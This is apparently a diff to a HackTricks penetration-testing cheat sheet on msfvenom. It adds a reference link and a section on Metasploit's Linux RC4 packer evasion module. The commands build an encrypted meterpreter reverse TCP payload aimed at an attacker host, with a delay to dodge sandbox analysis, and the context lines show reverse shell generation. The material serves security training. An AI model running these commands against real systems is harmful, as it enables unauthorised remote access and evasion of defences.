@@ -2,6 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+## References
+
+- [Metasploit Wrap-Up 03/13/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-03-13-2026)
+
+
+
 ---
 
 ## Basic msfvenom
@@ -25,6 +31,21 @@ msfvenom -l encoders #Encoders
 -e x86/shikata_ga_nai -i 5
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
+```
+
+## Metasploit Evasion (Linux RC4 Packer)
+
+This evasion module wraps a Linux x64 payload in a small loader that decrypts it with RC4 at runtime. It can also add a `nanosleep` delay before execution to reduce short-lived sandbox detonation.
+
+```bash
+msfconsole -q
+use evasion/linux/x64/rc4_packer
+show options
+set PAYLOAD linux/x64/meterpreter_reverse_tcp
+set LHOST <attacker_ip>
+set LPORT <attacker_port>
+# Configure the RC4 key / optional delay / output file as shown in options
+run
 ```
 
 ## **Windows**
@@ -169,7 +190,10 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 
-{{#include ../../banners/hacktricks-training.md}}
+## References
 
+- [Metasploit Wrap-Up 03/13/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-03-13-2026)
+
+{{#include ../../banners/hacktricks-training.md}}
 
 
